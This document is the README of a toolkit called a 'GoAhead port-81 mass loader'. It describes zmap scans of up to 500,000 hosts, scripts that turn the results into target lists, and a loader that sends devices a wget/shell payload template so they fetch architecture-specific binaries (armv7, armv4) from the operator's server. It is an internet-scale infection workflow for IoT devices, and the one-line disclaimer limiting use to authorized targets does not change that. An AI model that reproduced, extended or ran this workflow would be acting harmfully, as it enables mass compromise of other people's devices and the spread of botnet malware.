# GoAhead port-81 mass loader

Toolkit to scan GoAhead-based devices on **port 81**, build target lists, and run `loader.py` with a staged HTTP payload.

## Prerequisites

- **zmap** for wide port scans
- **Python 3** for `mklist.py` and `loader.py`
- VPS or static host serving your binaries (`armv7`, `armv4`, etc.)

## Workflow

1. Scan for open port 81 (example cap 500k hosts):

   ```bash
   zmap -p81 -o gome.txt -N 500000
   ```

2. Build a loader input list from scan output:

   ```bash
   python mklist.py gome.txt 500 goahead
   ```

3. Edit **`payload_file`**: replace `0.0.0.0` with your server IP and point URLs at your `armv7` / `armv4` (or other) blobs.

4. Run the loader:

   ```bash
   python loader.py
   ```

## Files

| File | Role |
|------|------|
| `loader.py` | Delivers payload to targets from generated lists |
| `mklist.py` | Converts zmap output into loader batches |
| `payload_file` | Embedded wget/shell template (must set your IP) |

## Community / support

Historical support link was listed in `readme.txt`; use your own channels for fork maintenance.

## Disclaimer

Lab and explicitly authorized targets only.
